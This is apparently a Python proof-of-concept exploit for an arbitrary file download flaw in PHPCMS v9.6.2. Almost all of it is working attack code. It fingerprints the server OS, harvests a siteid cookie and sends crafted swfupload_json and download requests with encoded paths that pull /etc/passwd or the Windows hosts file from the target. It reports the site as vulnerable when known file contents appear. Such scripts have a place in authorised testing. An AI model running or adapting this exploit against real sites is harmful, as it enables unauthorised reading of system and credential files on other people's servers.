# coding: utf-8
'''
name: PHPCMS v9.6.2 任意文件下载
author: Anka9080
description: 过滤函数不严谨导致任意文件下载。
'''
import sys
import requests
from termcolor import cprint

def get_os(target):
    """ 通过简单URL大小写判断是Win or Linux """
    r = requests.get(target + 'Index.php')
    if r.status_code == 200:
        return 'WINDOWS'
    else:
        return 'LINUX'

def poc(target):
    print('[*] first req, get os type to set different download-file url')
    os = get_os(target)
    print('[*] second req, get cookie_siteid param')
    url = target +'index.php?m=wap&c=index&a=init&siteid=1'
    s = requests.Session()
    r = s.get(url)
    cookie_siteid =  r.headers['set-cookie']
    cookie_siteid = cookie_siteid[cookie_siteid.index('=')+1:]
    # print cookie_siteid
    print('[*] third req, get att_json param')
    # 目标文件 /etc/passwd
    if os == 'WINDOWS':
        url = target + 'index.php?m=attachment&c=attachments&&a=swfupload_json&aid=1&src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3Dc:Windows/System32/drivers/etc/host%26f%3Ds%3%25252%2*70C'
    else:
        url = target + 'index.php?m=attachment&c=attachments&&a=swfupload_json&aid=1&src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3D/etc/passw%26f%3Dd%3%25252%2*70C'        
    post_data = {
        'userid_flash':cookie_siteid
    }
    r = s.post(url,post_data)
    # print r.headers
    for cookie in s.cookies:
        if '_att_json' in cookie.name:
            cookie_att_json = cookie.value
    # print cookie_att_json
    print('[*] fourth req, get download url')
    url = target + 'index.php?m=content&c=down&a=init&a_k=' + cookie_att_json
    r = s.get(url)
    # print r.text
    if 'm=content&c=down&a=download&a_k=' in r.text:
        start = r.text.index('download&a_k=')
        end = r.text.index('" class="xzs')
        # print('-- start: {}  end: {}'.format(start,end))
        download_url = r.text[start+13:end]
        download_url = target + 'index.php?m=content&c=down&a=download&a_k=' + download_url
        # print('-- download_url:{}'.format(download_url))
        r = s.get(download_url)
        # print r.text

        if os == 'WINDOWS': # windows hosts file
            if 'HOSTS file' in r.text:
                cprint('[!] Vul : {}'.format(target),'red')
                return True
        else:
            if 'root:x:0:0' in r.text:
                cprint('[!] Vul : {}'.format(target),'red')
                return True

if __name__ == "__main__":

    poc('http://localhost/PHPCMS/PHPCMS_v9.6.2/')